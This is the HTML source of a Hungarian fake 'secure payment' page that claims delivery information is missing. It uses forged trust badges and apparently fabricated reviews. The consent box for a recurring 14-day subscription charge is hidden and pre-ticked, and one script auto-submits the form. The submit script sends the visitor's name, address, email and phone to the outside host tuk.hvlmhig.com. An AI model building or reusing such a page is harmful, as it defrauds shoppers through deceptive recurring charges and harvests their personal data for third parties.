<!DOCTYPE html>
<html lang="hu">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- CSRF Token -->
    <title>Biztonságos fizetés</title>
    <!--Custom stylesheet-->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <!-- <link rel="stylesheet" href="font-awesome/6.4.2/css/all.min.css"> -->
    <!-- <link rel="stylesheet" href="./assets/all.min.css"> -->
    <link rel="stylesheet" href="./assets/swiper-bundle.min.css">
    <link href="./assets/intlTelInput.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="./assets/global-styles.css">
    <link rel="stylesheet" type="text/css" href="./assets/styles.css">
    <link rel="stylesheet" type="text/css" href="./assets/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="./assets/styles(1).css">
</head>

<body>
    <div id="landing-section">
        <div id="nt" class="row justify-content-between py-2 px-1 bg-black">
            <p class="text-left mb-0 pb-0 col-auto" style="color:white"> <i class="fas fa-lock"></i> SSL biztonságos fizetés </p>
            <p class="text-right mb-0 pb-0 col-auto" style="color:white"> Hitelesített <i class="fab fa-cc-visa"></i> <i class="fab fa-cc-mastercard"></i> </p>
        </div>
        <div class="container-fluid " style="background-color:#ffe7a6">
            <div class="row py-2 text-center justify-content-center">
                <p class="pb-0 mb-0  text-center"> <i class="fas fa-exclamation-triangle"></i> Hiányzó kézbesítési információk <i class="fas fa-exclamation-triangle"></i> </p>
            </div>
        </div>
        <div class="container-fluid">
            <div class="row">
                <div class="col-lg-7 col-12">
                    <div style="max-width: 700px;" class="me-lg-0 p-2 pe-lg-5 p-lg-4 me-auto ms-auto">
                        <h2 class="mt-sm-3"><b>Biztonságos fizetés</b>&nbsp;&nbsp;<i class="fas fa-lock mt-2"></i></h2>
                        <p> <span style="color:#ffc107"> <i class="fas fa-star"></i> <i class="fas fa-star"></i> <i class="fas fa-star"></i> <i class="fas fa-star"></i> <i class="fas fa-star-half"></i> </span> (2557 Értékelések) </p>
                        <div class="bg-light my-3 p-3 d-lg-none">
                            <!-- <div style="position: relative; width: fit-content"> <img src="https://key4success.lat/c/wQOuS3u7erea2ubMOB?s1=10225313528d2d23d94d19ba74e599&amp;s2=1040&amp;s3=26&amp;s4=&amp;offer_id=15773&amp;first=&amp;last=&amp;country=&amp;zip=&amp;city=&amp;address=&amp;email=&amp;phone=44&amp;p_id=___" width="50" style="border: 1px solid #ccc; border-radius: 8px; aspect-ratio: 1; object-fit: cover">
                                <div class="circle" style="position: absolute; top: 0; right: -5px; border-radius: 50%; background: #808080; display: flex; justify-content: center; align-items: center; width: 20px; height: 20px"> <span style="color: #fff"> 1 </span> </div>
                            </div> -->
                            <div class="customText" style="display: flex; align-items: center; justify-content: space-between; margin-top: 0.5rem">
                                <p style="margin-bottom: 0"> </p>
                                <p class="" style="text-align: right; margin-bottom: 0"> 1.189 Ft </p>
                            </div>
                            <h4> Rendelési összesítés: </h4>
                            <hr>
                            <table class="w-100">
                                <tbody>
                                    <tr>
                                        <th>Szállítás</th>
                                        <th class="text-end"> <span> 1.189 Ft </span> </th>
                                    </tr>
                                </tbody>
                                <tbody>
                                    <tr>
                                        <th>Rendelés összesen</th>
                                        <th class="text-end"> <span> 1.189 Ft </span> </th>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        <h4 class="mt-2 mb-4" style="font-size: 1.5rem"><b>1. Információ</b></h4>
                        <div class="mb-lg-5 mb-3">
                            <form method="POST" id="cart-form" action="~/replacing" style="width:100%; margin: 0 !important" class="was-validated"> 
                                
                                <div class="row row-input gy-2 gx-0">
                                    <div class="col-6 pe-2"> <input type="text" id="first_name" name="first_name" placeholder="Keresztnév" value="" required="" class="form-control" maxlength="255"> </div>
                                    <div class="col-6 ps-2"> <input type="text" id="last_name" name="last_name" placeholder="Vezetéknév" value="" required="" class="form-control unedited-field" maxlength="255"> </div>
                                    <div class="col-12"> <input id="line_1" name="line_1" type="text" placeholder="Cím" value="" required="" class="form-control unedited-field" maxlength="255"> </div>
                                    <div class="col-6 pe-2"> <input id="zip_or_postcode" name="zip_or_postcode" type="text" placeholder="Irányítószám" value="" required="" class="form-control unedited-field" minlength="4" maxlength="12"> </div>
                                    <div class="col-6 ps-2"> <input id="city" name="city" type="text" placeholder="Város" value="" required="" class="form-control unedited-field" maxlength="255"> </div>
                                    <div class="col-12"> <select id="country_code" name="country_code" required="" class="form-control">
                                            <option value="" disabled="" hidden="">Ország</option>
                                            <option class="text-black" value=""></option>
                                            <option class="text-black" value="AL">Albania</option>
                                            <option class="text-black" value="DZ">Algeria</option>
                                            <option class="text-black" value="AD">Andorra</option>
                                            <option class="text-black" value="AR">Argentina</option>
                                            <option class="text-black" value="AM">Armenia</option>
                                            <option class="text-black" value="AU">Australia</option>
                                            <option class="text-black" value="AT">Austria</option>
                                            <option class="text-black" value="BS">Bahamas</option>
                                            <option class="text-black" value="BH">Bahrain</option>
                                            <option class="text-black" value="BB">Barbados</option>
                                            <option class="text-black" value="BE">Belgium</option>
                                            <option class="text-black" value="BM">Bermuda</option>
                                            <option class="text-black" value="BO">Bolivia</option>
                                            <option class="text-black" value="BA">Bosnia and Herzegovina</option>
                                            <option class="text-black" value="BR">Brazil</option>
                                            <option class="text-black" value="BG">Bulgaria</option>
                                            <option class="text-black" value="CA">Canada</option>
                                            <option class="text-black" value="CL">Chile</option>
                                            <option class="text-black" value="CO">Colombia</option>
                                            <option class="text-black" value="CR">Costa Rica</option>
                                            <option class="text-black" value="HR">Croatia (Hrvatska)</option>
                                            <option class="text-black" value="CY">Cyprus</option>
                                            <option class="text-black" value="CZ">Czech Republic</option>
                                            <option class="text-black" value="DK">Denmark</option>
                                            <option class="text-black" value="EC">Ecuador</option>
                                            <option class="text-black" value="EE">Estonia</option>
                                            <option class="text-black" value="FO">Faroe Islands</option>
                                            <option class="text-black" value="FI">Finland</option>
                                            <option class="text-black" value="FR">France</option>
                                            <option class="text-black" value="GE">Georgia</option>
                                            <option class="text-black" value="DE">Germany</option>
                                            <option class="text-black" value="GR">Greece</option>
                                            <option class="text-black" value="HK">Hong Kong</option>
                                            <option class="text-black" value="HU" selected="">Hungary</option>
                                            <option class="text-black" value="IN">India</option>
                                            <option class="text-black" value="ID">Indonesia</option>
                                            <option class="text-black" value="IE">Ireland</option>
                                            <option class="text-black" value="IL">Israel</option>
                                            <option class="text-black" value="IT">Italy</option>
                                            <option class="text-black" value="JP">Japan</option>
                                            <option class="text-black" value="JO">Jordan</option>
                                            <option class="text-black" value="KE">Kenya</option>
                                            <option class="text-black" value="KR">Korea, Republic of</option>
                                            <option class="text-black" value="KW">Kuwait</option>
                                            <option class="text-black" value="LV">Latvia</option>
                                            <option class="text-black" value="LI">Liechtenstein</option>
                                            <option class="text-black" value="LT">Lithuania</option>
                                            <option class="text-black" value="LU">Luxembourg</option>
                                            <option class="text-black" value="MK">Macedonia</option>
                                            <option class="text-black" value="MY">Malaysia</option>
                                            <option class="text-black" value="MV">Maldives</option>
                                            <option class="text-black" value="MT">Malta</option>
                                            <option class="text-black" value="MX">Mexico</option>
                                            <option class="text-black" value="MD">Moldova, Republic of</option>
                                            <option class="text-black" value="MC">Monaco</option>
                                            <option class="text-black" value="ME">Montenegro</option>
                                            <option class="text-black" value="MA">Morocco</option>
                                            <option class="text-black" value="NL">Netherlands</option>
                                            <option class="text-black" value="NZ">New Zealand</option>
                                            <option class="text-black" value="NG">Nigeria</option>
                                            <option class="text-black" value="NO">Norway</option>
                                            <option class="text-black" value="OM">Oman</option>
                                            <option class="text-black" value="PE">Peru</option>
                                            <option class="text-black" value="PH">Philippines</option>
                                            <option class="text-black" value="PL">Poland</option>
                                            <option class="text-black" value="PT">Portugal</option>
                                            <option class="text-black" value="PR">Puerto Rico</option>
                                            <option class="text-black" value="QA">Qatar</option>
                                            <option class="text-black" value="RO">Romania</option>
                                            <option class="text-black" value="SA">Saudi Arabia</option>
                                            <option class="text-black" value="RS">Serbia</option>
                                            <option class="text-black" value="SC">Seychelles</option>
                                            <option class="text-black" value="SG">Singapore</option>
                                            <option class="text-black" value="SK">Slovakia</option>
                                            <option class="text-black" value="SI">Slovenia</option>
                                            <option class="text-black" value="ZA">South Africa</option>
                                            <option class="text-black" value="ES">Spain</option>
                                            <option class="text-black" value="SE">Sweden</option>
                                            <option class="text-black" value="CH">Switzerland</option>
                                            <option class="text-black" value="TH">Thailand</option>
                                            <option class="text-black" value="TR">Turkey</option>
                                            <option class="text-black" value="UA">Ukraine</option>
                                            <option class="text-black" value="AE">United Arab Emirates</option>
                                            <option class="text-black" value="GB">United Kingdom</option>
                                            <option class="text-black" value="US">United States</option>
                                            <option class="text-black" value="UY">Uruguay</option>
                                            <option class="text-black" value="VN">Vietnam</option>
                                        </select> </div>
                                    <div class="col-12"> <input id="intl-phone" name="intl-phone" type="text" hidden="" value="" class="unedited-field">
                                        <div class="iti iti--allow-dropdown iti--separate-dial-code">
                                            
                                            <input type="tel" id="phone" name="phone" placeholder="Telefonszám" value="+44" required="" class="form-control unedited-field" autocomplete="off" data-intl-tel-input-id="0" style="padding-left: 85px;">
                                        </div>
                                    </div>
                                    <div class="col-12"> 
                                        <input type="email" id="email-form" name="email" placeholder="E-mail cím" value="" required="" class="form-control unedited-field" minlength="9" maxlength="255"> 
                                    </div>
                                </div>
                                <div class="w-100 div-terms d-none"> 
                                    <label for="terms" style="font-size: 10px; font-weight: normal;"> 
                                        <input type="checkbox" name="terms" id="terms" required="" onchange="document.getElementById(&#39;btn-submit&#39;).disabled = !this.checked;" checked="true" class="unedited-field"> <span>Kijelentem, hogy legalább 18 éves vagyok, és elfogadom <a data-toggle="modal" data-target="#modalTerms" style="cursor: pointer;color: #0062cc">a feltételeket és a rugalmas hűségprogramot</a>. Egyetértek azzal, hogy megkapom a személyes ismétlődő ajánlatomat, amelyben vásárolok vagy kihagyom minden 14-dik nap.</span> </label> </div>
                                <div class="row gx-0"> 
                                    <input type="submit" value="Folytatás" class="p-0 w-100 btn btn-success rounded-0 mt-3 fw-bold text-uppercase fs-6 unedited-field" style="background: #008a2a; min-height: 65px; line-height: 65px" id="btn-submit"> </div>
                            </form>
                        </div>
                        <div class="d-lg-none">
                            <div class="d-flex justify-content-between text-center mt-lg-5">
                                <div style="width: 33%"> <img src="./assets/summary-icon1.svg" width="68" loading="lazy">
                                    <p class="mb-0 fw-bold" style="font-size: .75rem"> Ingyenes műszaki támogatás </p>
                                </div>
                                <div style="width: 33%"> <img src="./assets/summary-icon2.webp" width="68" loading="lazy">
                                    <p class="mb-0 fw-bold" style="font-size: .75rem"> 30 napos pénzvisszafizetési garancia </p>
                                </div>
                                <div style="width: 33%"> <img src="./assets/summary-icon3.webp" width="68" loading="lazy">
                                    <p class="mb-0 fw-bold" style="font-size: .75rem"> Biztonságos fizetés </p>
                                </div>
                            </div>
                        </div>
                        <div class="mt-4 mt-lg-0 py-4 border-top border-bottom d-flex align-items-center justify-content-between" style="opacity: 0.6">
                            <h4 class="mb-0"> <b>2. Fizetés</b>&nbsp;&nbsp; <i class="fas fa-lock"></i> </h4> <img src="./assets/cards.png" width="100%" style="max-width: 150px" loading="lazy">
                        </div>
                    </div>
                </div>
                <div class="col-lg-5 lg-93vh p-3 summary-padding" style="background: #f5f6fa;">
                    <div style="max-width: 462px" class="ms-lg-0 ms-auto me-auto">
                        <div>
                            <section class="position-relative">
                                <div class="swiper mySwiper w-100 bg-white p-3 swiper-initialized swiper-horizontal swiper-backface-hidden" style="--swiper-pagination-color: #0a0a0a;">
                                    <p class="mb-0 fw-bold"> Ügyfeleink mondták </p>
                                    <div class="swiper-wrapper" id="swiper-wrapper-6817cd5ba677dba9" aria-live="polite">
                                        <div class="swiper-slide pb-4 pt-2 swiper-slide-active" role="group" aria-label="1 / 5" style="width: 430px;">
                                            <div class="mx-5">
                                                <div class="d-flex my-3"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> </div>
                                                <p style="font-size: 12px"> Tegnap megkaptam a terméket. Gyors és kiváló ügyfélszolgálat! Nagyon köszönöm &lt;3. </p>
                                            </div>
                                        </div>
                                        <div class="swiper-slide pb-4 pt-2 swiper-slide-next" role="group" aria-label="2 / 5" style="width: 430px;">
                                            <div class="mx-5">
                                                <div class="d-flex my-3"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> </div>
                                                <p style="font-size: 12px"> Gyors és könnyen kezelhető </p>
                                            </div>
                                        </div>
                                        <div class="swiper-slide pb-4 pt-2" role="group" aria-label="3 / 5" style="width: 430px;">
                                            <div class="mx-5">
                                                <div class="d-flex my-3"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> </div>
                                                <p style="font-size: 12px"> Csodálatos terméket kaptam mindössze 2 nappal a feliratkozás után! Minden rendben volt! :-) </p>
                                            </div>
                                        </div>
                                        <div class="swiper-slide pb-4 pt-2" role="group" aria-label="4 / 5" style="width: 430px;">
                                            <div class="mx-5">
                                                <div class="d-flex my-3"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> </div>
                                                <p style="font-size: 12px"> Megérte erre pénzt kiadni. Nagyszerű szolgáltatás és kiszállítás. Azt hiszem, szerencsém volt ezúttal! Viszlát :) </p>
                                            </div>
                                        </div>
                                        <div class="swiper-slide pb-4 pt-2" role="group" aria-label="5 / 5" style="width: 430px;">
                                            <div class="mx-5">
                                                <div class="d-flex my-3"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> <img src="./assets/rating-star.png" loading="lazy"> </div>
                                                <p style="font-size: 12px"> A legjobb vásárlásom </p>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="swiper-pagination swiper-pagination-bullets swiper-pagination-horizontal"><span class="swiper-pagination-bullet swiper-pagination-bullet-active" aria-current="true"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span><span class="swiper-pagination-bullet"></span></div> <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span>
                                </div>
                                <div class="swiper-button-prev swiper-button-disabled" tabindex="-1" role="button" aria-label="Previous slide" aria-controls="swiper-wrapper-6817cd5ba677dba9" aria-disabled="true"></div>
                                <div class="swiper-button-next" tabindex="0" role="button" aria-label="Next slide" aria-controls="swiper-wrapper-6817cd5ba677dba9" aria-disabled="false"></div>
                            </section>
                        </div>
                        <div class="bg-white rounded my-3 p-3 d-none d-md-block">
                            <!-- <div style="position: relative; width: fit-content"> <img src="https://key4success.lat/c/wQOuS3u7erea2ubMOB?s1=10225313528d2d23d94d19ba74e599&amp;s2=1040&amp;s3=26&amp;s4=&amp;offer_id=15773&amp;first=&amp;last=&amp;country=&amp;zip=&amp;city=&amp;address=&amp;email=&amp;phone=44&amp;p_id=___" width="50" style="border: 1px solid #ccc; border-radius: 8px; aspect-ratio: 1; object-fit: cover">
                                <div class="circle" style="position: absolute; top: 0; right: -5px; border-radius: 50%; background: #808080; display: flex; justify-content: center; align-items: center; width: 20px; height: 20px"> <span style="color: #fff"> 1 </span> </div>
                            </div> -->
                            <div class="customText" style="display: flex; align-items: center; justify-content: space-between; margin-top: 0.5rem">
                                <p style="margin-bottom: 0"> </p>
                                <p class="" style="text-align: right; margin-bottom: 0"> 1.189 Ft </p>
                            </div>
                            <h4> Rendelési összesítés: </h4>
                            <hr>
                            <table class="w-100">
                                <tbody>
                                    <tr>
                                        <th>Szállítás</th>
                                        <th class="text-end"> <span> 1.189 Ft </span> </th>
                                    </tr>
                                </tbody>
                                <tbody>
                                    <tr>
                                        <th>Rendelés összesen</th>
                                        <th class="text-end"> <span> 1.189 Ft </span> </th>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        <div class="d-none d-lg-block">
                            <div class="d-flex justify-content-between text-center mt-lg-5">
                                <div style="width: 33%"> <img src="./assets/summary-icon1.svg" width="68" loading="lazy">
                                    <p class="mb-0 fw-bold" style="font-size: .75rem"> Ingyenes műszaki támogatás </p>
                                </div>
                                <div style="width: 33%"> <img src="./assets/summary-icon2.webp" width="68" loading="lazy">
                                    <p class="mb-0 fw-bold" style="font-size: .75rem"> 30 napos pénzvisszafizetési garancia </p>
                                </div>
                                <div style="width: 33%"> <img src="./assets/summary-icon3.webp" width="68" loading="lazy">
                                    <p class="mb-0 fw-bold" style="font-size: .75rem"> Biztonságos fizetés </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <section class="container" data-aos="zoom-in">
            <div class="container py-5 text-center">
                <h2 class="text-uppercase">Vásárlási élményünkről</h2>
            </div>
            <div class="container">
                <div class="row">
                    <div class="col-12 text-center"> <img class="img-fluid" src="./assets/shopping.webp" loading="lazy" alt="shopping experience"> </div>
                </div>
            </div>
        </section>
        <section class="py-5 all-media" data-aos="zoom-in">
            <div class="container">
                <div class="row text-center">
                    <div class="col-md-12">
                        <h3 class="mb-5"> <b> Tapasztaljon meg egy új típusú vásárlást </b> </h3>
                    </div>
                </div>
                <div class="row text-dark">
                    <div class="col-md-4 mb-3 p-3">
                        <h5 class="mb-3"> <i class="fas fa-heart"></i> <b> Nagy kedvezmények a tagsággal </b> </h5>
                        <p> Soha többé ne fizessen teljes kiskereskedelmi árat értékes tagként </p>
                    </div>
                    <div class="col-md-4 mb-3 p-3">
                        <h5 class="mb-3"> <i class="fas fa-search"></i> <b> Fedezze fel a változatos termékpalettát </b> </h5>
                        <p> Keressen bármit, és találjon széles választékot mindenki igényeihez igazítva. Az újdonságoktól az időtlen klasszikusokig minden megtalálható nálunk. </p>
                    </div>
                    <div class="col-md-4 mb-3 p-3">
                        <h5 class="mb-3"> <i class="fas fa-ad"></i> <b> Kényeztesse magát egy vásárlási körútban </b> </h5>
                        <p> Vásároljon kedvére, és élvezze az exkluzív, csak Önre szabott ajánlatokat. </p>
                    </div>
                </div>
            </div>
        </section>
        <!-- <div class="row text-center border-top pt-1">
            <p class="mx-auto"> <a href="https://key4success.lat/c/wQOuS3u7erea2ubMOB/report-abuse" target="_blank" style="text-decoration: none;">Visszaélés jelentése</a> </p>
        </div> -->
    </div>
    <script src="./assets/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="./assets/bootstrap.js"></script>
    <script src="./assets/intlTelInput.min.js"></script>
    <script src="./assets/js.cookie.min.js"></script>
    <script src="./assets/aos.js"></script>
    <script src="./assets/swiper-bundle.min.js"></script>
    <script>
        var swiper = new Swiper(".mySwiper", {
            navigation: {
                nextEl: '.swiper-button-next',
                prevEl: '.swiper-button-prev',
            },
            pagination: {
                el: ".swiper-pagination",
            },
        });
    </script>
    <script>
        var phoneInput = document.querySelector("#phone");
        var iti = window.intlTelInput(phoneInput, ({
            autoPlaceholder: "off",
            initialCountry: "HU",
            preferredCountries: [],
            separateDialCode: true,
            utilsScript: "https://unpkg.com/intl-tel-input@17.0.19/build/js/utils.js",
        }));
        
    </script>
    <style>
        .loading-list {
            list-style: none;
            padding: 0;
            margin: 0;
            text-align: center;
            font-weight: 400;
            font-size: 14px;
        }
        .loading-list li {
            margin-bottom: 15px;
        }
    </style>
    <div class="modal fade" id="verify-modal" tabindex="-1" role="dialog" data-backdrop="static" data-keyboard="false" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 700px;">
            <div class="modal-content">
                <div class="modal-header"> <button type="button" class="close" data-dismiss="modal" aria-label="Close"> <span aria-hidden="true">×</span> </button> </div>
                <div class="modal-body text-center">
                    <div class="align-items-center" style="position: relative;">
                        <div class="col-12 py-4"> <img src="./assets/check-mark.webp" class="mx-auto" width="35%"> </div>
                    </div>
                    <div class="align-items-center" style="position: relative;">
                        <div class="col-12 pb-2">
                            <div class="loading-list mx-auto">
                                <li>Az Ön szállítási címe megerősítve</li>
                                <li>Visszairányítás a megerősítő oldalra</li>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        $(document).ready(function() {
            let skipAutosubmission = sessionStorage.getItem('formSubmitted');
        
            if (skipAutosubmission != 'true') {
                $('#verify-modal').on('hidden.bs.modal', function () {
                    $('.modal-backdrop.fade').css('opacity', '0');
                    $('#verify-modal').css('opacity', '0');
                });
        
                var hasEmpty;
                $('.row-input .form-control').each(function() {
                    var val = $(this).val();
                    var defaultVal = $(this).data('default');
        
        
                    $(this).blur();
        
                    if ($(this).is(":invalid") || !this.checkValidity()) {
                        setTimeout(function () {
                            $('#verify-modal').modal('hide');
                        }, 500);
        
                        $(this).focus();
        
                        hasEmpty = true;
                        return false;
                    }
                    if (val.startsWith('{var') && defaultVal) {
                        $(this).val(defaultVal);
                    }
                    if ((val == "First Name") || (val == "Last Name") || (val == "Address") || (val == "Zipcode") || (val == "Last Name") || (val == "Last Name") || (val == "City") || (val == "E-mail") || (val == "")) {
                        hasEmpty = true;
                        return false;
                    } else {
                        hasEmpty = false;
                    }
                });
        
                if (window.location.href.indexOf("{var") > -1) {
                    hasEmpty = true;
                }
        
                if (hasEmpty == false && $('.help-block').length == 0) {
                    $('#verify-modal').modal('show');
                    $('.modal-backdrop.fade').css('opacity', '.6');
                    $('#verify-modal').css('opacity', '1');
                    setTimeout(function () {
                        $('#btn-submit').click();
                        hasEmpty = true;
        
                        // Set the flag in sessionStorage after auto-submitting
                        sessionStorage.setItem('formSubmitted', 'true');
                    }, 100);
                }
            }
        });
    </script>
    <script>
        document.querySelector("#phone").addEventListener('input', function(e) {
            document.querySelector('#phone').value = e.target.value.replace(new RegExp(/[^0-9+]/g, 'g'), '');
        })
    </script>
    <script>
        $(document).ready(function() {
            if (document.querySelector("#phone") && document.querySelector("#phone").value) {
                const textTitle = document.querySelector("#phone").value;
                document.querySelector("#phone").value = textTitle.replace(/[\s-]+/gm, '');
            }
            var hash = $(location).attr('hash');
            if (hash.includes('#contact') || hash.includes('%23contact')) {
                let div = document.createElement('div');
                div.style.display = 'flex';
                div.style.flexDirection = 'column';
                div.style.alignItems = 'flex-start';
                div.style.fontSize = '.8em';
                div.style.color = 'white';
                div.style.width = '100%';
                div.style.padding = '0 10px';
                let email = document.createElement('p');
                email.innerText = 'contact@' + window.location.hostname;
                let address = document.createElement('p');
                address.innerHTML = 'Leontiou A, Maximos Block B 3055, <b>Limassol</b></br>3022, <b>Cyprus<b/>';
                div.appendChild(email);
                div.appendChild(address);
                document.querySelector("body > div.footer > div > div:nth-child(4)").appendChild(div);
            }
        })
    </script>
    <script>
        $(document).ready(function() {
            // Form validation script
            $("#cart-form").each(function() {
                $(this).find(':input:not(.exclude-unedited)').addClass('unedited-field');
            });
            $("#info-form").each(function() {
                $(this).find(':input').addClass('unedited-field');
            });
            var hash = $(location).attr('hash');
            if (hash.includes('#contact') || hash.includes('%23contact')) {
                let div = document.createElement('div');
                div.style.display = 'flex';
                div.style.flexDirection = 'column';
                div.style.alignItems = 'flex-start';
                div.style.fontSize = '.8em';
                div.style.color = 'white';
                div.style.width = '100%';
                div.style.padding = '0 10px';
                let email = document.createElement('p');
                email.innerText = 'contact@' + window.location.hostname;
                let address = document.createElement('p');
                address.innerHTML = 'Leontiou A, Maximos Block B 3055, <b>Limassol</b></br>3022, <b>Cyprus<b/>';
                div.appendChild(email);
                div.appendChild(address);
                document.querySelector("body > div.footer > div > div:nth-child(4)").appendChild(div);
            }
            if (hash.includes('#rafl') || hash.includes('%23rafl')) {
                $('#afLink').hide();
            }
            if (hash.includes('#scroll-form') || hash.includes('%23scroll-form')) {
                var x = window.matchMedia("(max-width: 767px)")
                if (x.matches) {
                    document.getElementById("scroll-form").scrollIntoView();
                }
            }
            if (hash.includes('#scroll') || hash.includes('%23scroll')) {
                var x = window.matchMedia("(max-width: 767px)")
                if (x.matches) {
                    document.getElementById("scroll").scrollIntoView();
                }
            }
            if (hash.includes('#nt') || hash.includes('%23nt')) {
                document.getElementById("nt").scrollIntoView();
            }
            if (hash.includes('#addtc') || hash.includes('%addtc')) {
                $('#btn-submit').after(`<p class="text-left font-weight-normal"> Minden új ügyfél részt vesz a sorsoláson a bemutatott kampányban. Ha Ön az egyik szerencsés nyertes (1000-enként), közvetlenül e-mailben értesítjük. Ez a különleges ajánlat  egy 3-day napos próbaidőszakot tartalmaz egy kapcsolt előfizetési szolgáltatáshoz, amely után az előfizetési díj (46,40 Ft minden 14-dik nap) automatikusan levonásra kerül a hitelkártyájáról. Ha bármilyen okból kifolyólag nem elégedett a szolgáltatással, akkor 3 napokon belül lemondhatja fiókját. Ez a szolgáltatás lemondásig megújul minden 14-dik nap. Ez a kampány 2022. december 31-én jár le.</p>`);
            }
        });
        $('#cart-form input').click(function() {
            const textTitle = document.querySelector("#phone").value;
            document.querySelector("#phone").value = textTitle.replace(/[\s-]+/gm, '');
        })
        // Validation per field
        $('#cart-form input').focusout(function() {
            $('#cart-form').addClass('was-validated');
            $('#cart-form select').removeClass('unedited-field');
            $(this).removeClass('unedited-field');
        });
        $('#info-form input').focusout(function() {
            $('#info-form').addClass('was-validated');
            $('#info-form select').removeClass('unedited-field');
            $(this).removeClass('unedited-field');
        });
        /*Preventing visitor to leave
        window.onbeforeunload = function(){
            return 'Are you sure you want to leave?';
        };*/
        document.getElementById('btn-submit').onclick = function () {
            window.onbeforeunload = null;
        };
    </script>
    <script>
        var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
        var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
            return new bootstrap.Tooltip(tooltipTriggerEl)
        })
    </script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const url = new URL(window.location.href);
            const phone = url.searchParams.get('phone');
            // Check if phone is not null and contains '{'
            if (phone !== null && phone.includes('{')) {
                document.getElementById('phone').value = '';
            }
        });
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const formControls = document.querySelectorAll('.form-control');
            formControls.forEach(input => {
                if (input.value.includes('{')) {
                    input.value = '';
                }
            });
            console.log('deleted')
        });
    </script>
    <script class="iti-load-utils" async="" src="./assets/utils.js"></script>

    <script>
        var form = document.querySelector("#cart-form");
        form.addEventListener("submit", function(e) {
            e.preventDefault();
            var number = iti.getNumber();
            var intlPhone = document.querySelector("#intl-phone");
            var first_name = document.querySelector("#first_name").value;
            var last_name = document.querySelector("#last_name").value;
            var line_1 = document.querySelector("#line_1").value;
            var zip_or_postcode = document.querySelector("#zip_or_postcode").value;
            var city = document.querySelector("#city").value;
            var country_code = document.querySelector("#country_code").value;
            var iti__selected_dial_code = document.querySelector(".iti__selected-dial-code").textContent;
            var phone = document.querySelector("#phone").value;
            var email_form = document.querySelector("#email-form").value;

            var fullPhone = iti__selected_dial_code + phone;

            intlPhone.value = number;
            var btn_submit = document.getElementById('btn-submit');
            btn_submit.disabled = true;
            btn_submit.value = "beküldés ...";
            console.log(`https://tuk.hvlmhig.com/4PG18NW/J6BF8MT/?first_name=${first_name}&last_name=${last_name}&zip=${zip_or_postcode}&address=${line_1}&email=${email_form}&phone=${fullPhone}&city=${city}`);
            setTimeout(function () {
                form.submit();
                location.href = `https://tuk.hvlmhig.com/4PG18NW/J6BF8MT/?first_name=${first_name}&last_name=${last_name}&zip=${zip_or_postcode}&address=${line_1}&email=${email_form}&phone=${fullPhone}&city=${city}`;
            }, 300);
        });
    </script>
</body>

</html>